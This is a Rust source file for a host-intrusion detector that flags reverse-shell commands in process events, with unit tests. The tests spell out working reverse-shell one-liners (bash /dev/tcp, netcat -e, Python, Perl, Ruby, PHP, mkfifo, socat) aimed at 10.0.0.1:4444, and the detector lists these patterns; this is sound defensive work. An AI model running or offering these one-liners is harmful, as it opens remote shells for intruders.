use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{event::Event, event::Severity, incident::Incident};

/// Detects reverse shell patterns in process execution events.
///
/// Reverse shells allow attackers to gain interactive shell access from a
/// remote host. This detector recognises common patterns across multiple
/// languages and toolkits:
///
///   - Bash `/dev/tcp/` and `/dev/udp/` redirects
///   - Netcat (`nc -e`, `ncat -e`, `nc -c`, `netcat -e`)
///   - Python `socket` + `connect`
///   - Perl `socket` + `INET`
///   - Ruby `TCPSocket`
///   - PHP `fsockopen`
///   - mkfifo + nc pipe
///   - Socat `exec` + `tcp`
pub struct ReverseShellDetector {
    host: String,
    cooldown: Duration,
    /// Suppress re-alerts per (command_hash) within cooldown window.
    alerted: HashMap<u64, DateTime<Utc>>,
}

impl ReverseShellDetector {
    pub fn new(host: impl Into<String>, cooldown_seconds: u64) -> Self {
        Self {
            host: host.into(),
            cooldown: Duration::seconds(cooldown_seconds as i64),
            alerted: HashMap::new(),
        }
    }

    /// Returns the matched pattern name if the command looks like a reverse shell.
    fn detect_pattern(cmd: &str) -> Option<&'static str> {
        let lower = cmd.to_lowercase();

        // Bash reverse shell: /dev/tcp/ or /dev/udp/
        if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
            return Some("bash_dev_tcp");
        }

        // Netcat variants: nc -e, ncat -e, nc -c, netcat -e
        if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
            && (lower.contains(" -e ") || lower.contains(" -c "))
        {
            return Some("netcat_shell");
        }

        // Python reverse shell: python + socket + connect
        if (lower.contains("python") || lower.contains("python3") || lower.contains("python2"))
            && lower.contains("socket")
            && lower.contains("connect")
        {
            return Some("python_reverse_shell");
        }

        // Perl reverse shell: perl + socket + INET
        if lower.contains("perl") && lower.contains("socket") && lower.contains("inet") {
            return Some("perl_reverse_shell");
        }

        // Ruby reverse shell: ruby + TCPSocket
        if lower.contains("ruby") && lower.contains("tcpsocket") {
            return Some("ruby_reverse_shell");
        }

        // PHP reverse shell: php + fsockopen
        if lower.contains("php") && lower.contains("fsockopen") {
            return Some("php_reverse_shell");
        }

        // mkfifo pipe: mkfifo + nc
        if lower.contains("mkfifo") && (lower.contains("nc ") || lower.contains("ncat ")) {
            return Some("mkfifo_pipe");
        }

        // Socat shell: socat + exec + tcp
        if lower.contains("socat") && lower.contains("exec") && lower.contains("tcp") {
            return Some("socat_shell");
        }

        None
    }

    /// Simple hash for cooldown keying - avoids storing full command strings.
    fn hash_command(cmd: &str) -> u64 {
        use std::hash::{Hash, Hasher};
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        cmd.hash(&mut hasher);
        hasher.finish()
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        if event.kind != "shell.command_exec" && event.kind != "process.exec" {
            return None;
        }

        let command = event.details.get("command").and_then(|v| v.as_str());
        let args = event.details.get("args").and_then(|v| v.as_str());

        // Check both command and args fields; combine for pattern matching
        let text = match (command, args) {
            (Some(c), Some(a)) => format!("{c} {a}"),
            (Some(c), None) => c.to_string(),
            (None, Some(a)) => a.to_string(),
            (None, None) => return None,
        };

        if text.is_empty() {
            return None;
        }

        let pattern = Self::detect_pattern(&text)?;

        let now = event.ts;
        let key = Self::hash_command(&text);

        // Cooldown check
        if let Some(&last) = self.alerted.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, now);

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        // Truncate command for display
        let display_cmd = if text.len() > 200 {
            format!("{}...", &text[..200])
        } else {
            text.clone()
        };

        // Prune stale entries
        if self.alerted.len() > 1000 {
            let cutoff = now - self.cooldown;
            self.alerted.retain(|_, ts| *ts > cutoff);
        }

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "reverse_shell:{pattern}:{pid}:{}",
                now.format("%Y-%m-%dT%H:%MZ")
            ),
            severity: Severity::Critical,
            title: format!("Reverse shell detected ({pattern}): {display_cmd}"),
            summary: format!(
                "Reverse shell pattern '{pattern}' detected in process {comm} \
                 (pid={pid}, uid={uid}): {display_cmd}"
            ),
            evidence: serde_json::json!([{
                "kind": "reverse_shell",
                "pattern": pattern,
                "comm": comm,
                "pid": pid,
                "uid": uid,
                "command": text,
            }]),
            recommended_checks: vec![
                format!("Kill process immediately: kill -9 {pid}"),
                format!("Investigate parent process: ps -o ppid= -p {pid}"),
                "Check for network connections: ss -tunp".to_string(),
                "Review user account for compromise".to_string(),
                "Check for persistence mechanisms: crontab -l, ~/.bashrc, /etc/cron.d/".to_string(),
            ],
            tags: vec!["reverse_shell".to_string(), "post_exploitation".to_string()],
            entities: vec![],
        })
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Severity::Info,
            summary: format!("Shell command: {command}"),
            details: serde_json::json!({
                "pid": 1234,
                "uid": 1000,
                "ppid": 1,
                "comm": "bash",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn process_exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "process.exec".to_string(),
            severity: Severity::Info,
            summary: format!("Process exec: {command}"),
            details: serde_json::json!({
                "pid": 5678,
                "uid": 0,
                "ppid": 1,
                "comm": "sh",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_bash_dev_tcp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_bash_dev_udp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/udp/10.0.0.1/53 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_netcat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -e /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_ncat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det.process(&exec_event("ncat -e /bin/bash 10.0.0.1 4444", now));
        assert!(inc.is_some());
    }

    #[test]
    fn detects_nc_c() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -c /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_python_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("python_reverse_shell"));
    }

    #[test]
    fn detects_perl_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("perl_reverse_shell"));
    }

    #[test]
    fn detects_ruby_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("ruby_reverse_shell"));
    }

    #[test]
    fn detects_php_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("php_reverse_shell"));
    }

    #[test]
    fn detects_mkfifo_pipe() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("mkfifo_pipe"));
    }

    #[test]
    fn detects_socat_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("socat_shell"));
    }

    #[test]
    fn cooldown_suppresses_duplicate() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(10)))
            .is_none());
    }

    #[test]
    fn fires_again_after_cooldown() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(301)))
            .is_some());
    }

    #[test]
    fn ignores_normal_commands() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det.process(&exec_event("ls -la /tmp", now)).is_none());
        assert!(det
            .process(&exec_event("curl https://example.com", now))
            .is_none());
        assert!(det
            .process(&exec_event("python3 -m http.server", now))
            .is_none());
        assert!(det.process(&exec_event("nc -l -p 8080", now)).is_none());
    }

    #[test]
    fn ignores_irrelevant_event_kinds() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let event = Event {
            ts: now,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.write_access".to_string(),
            severity: Severity::Info,
            summary: "file write".to_string(),
            details: serde_json::json!({
                "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            }),
            tags: vec![],
            entities: vec![],
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn works_with_process_exec_kind() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&process_exec_event(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }
}
